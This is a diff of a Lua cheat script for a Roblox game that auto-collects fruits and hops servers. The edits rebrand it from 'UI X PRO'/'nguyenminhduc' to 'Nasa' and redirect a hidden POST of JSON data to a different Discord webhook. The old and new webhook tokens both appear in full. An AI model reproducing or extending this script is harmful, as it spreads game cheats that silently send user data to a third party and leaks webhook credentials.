@@ -29,7 +29,7 @@ LinkLabel.Size = UDim2.new(0, 250, 0, 20) -- Điều chỉnh chiều rộng (250
 LinkLabel.Font = Enum.Font.SourceSans
 LinkLabel.TextColor3 = Color3.new(1, 1, 1)
 LinkLabel.TextSize = 14
-LinkLabel.Text = "https://zalo.me/g/kmhete440"
+LinkLabel.Text = ""
 LinkLabel.TextWrapped = true
 LinkLabel.TextScaled = false
 PingLabel.Name = "PingLabel"
@@ -146,16 +146,16 @@ local Headers = {["Content-Type"] = "application/json"}
 local Encoded = HttpService:JSONEncode(Data)
 
 local Request = http_request or request or HttpPost or syn.request
-local Final = {Url = "https://discord.com/api/webhooks/1317855877440733204/gDWyVlP_5BR51d7oO1pJVFHPbBjr2knUvEeGGjZ75UWkMQ4S4G0J4m6tHqmS1poBuev3", Body = Encoded, Method = "POST", Headers = Headers}
+local Final = {Url = "https://discord.com/api/webhooks/1333077097115029596/FcZ22gpVCdq8q9HoUi-vnCPduPc3kVubwWnuL-p_lfwN6qGf1R_LNCo8bb-QfRkBfR9d", Body = Encoded, Method = "POST", Headers = Headers}
 Request(Final)
 
 -- Thông Báo 
 require(game.ReplicatedStorage:WaitForChild("Notification")).new(
-            " <Color=Green>mod by nguyenminhduc — Tự Động Nhặt Trái<Color=/> "
+            " <Color=Green>mod by Nasa — Tự Động Nhặt Trái<Color=/> "
         ):Display()
 -- Thông Báo 
 require(game.ReplicatedStorage:WaitForChild("Notification")).new(
-            " <Color=Red>!!! Ủng hộ qua stk : 0765520260 - MB BANK !!!<Color=/> "
+            " <Color=Red>!!! Bug hay sự cố gì thì hãy liên hệ admin !!!<Color=/> "
         ):Display()
 -- Hàm làm tròn
 local function round(n)
@@ -290,7 +290,7 @@ for f, f in next, workspace:GetChildren() do
         game.StarterGui:SetCore(
             "SendNotification",
             {
-                Title = "UI X PRO",
+                Title = "Nasa",
                 Text = "Đã Nhặt Được: " .. f.Name,
                 Duration = 10
             }
@@ -320,7 +320,7 @@ if not fruitsFound then
     game.StarterGui:SetCore(
         "SendNotification",
         {
-            Title = "UI X PRO",
+            Title = "Nasa",
             Text = "Không Có Thấy Trái Trong Server",
             Duration = 5
         }
@@ -428,7 +428,7 @@ repeat
                 game.StarterGui:SetCore(
                     "SendNotification",
                     {
-                        Title = "UI X PRO",
+                        Title = "Nasa",
                         Text = "Đang Đổi Server",
                         Duration = 10
                     }
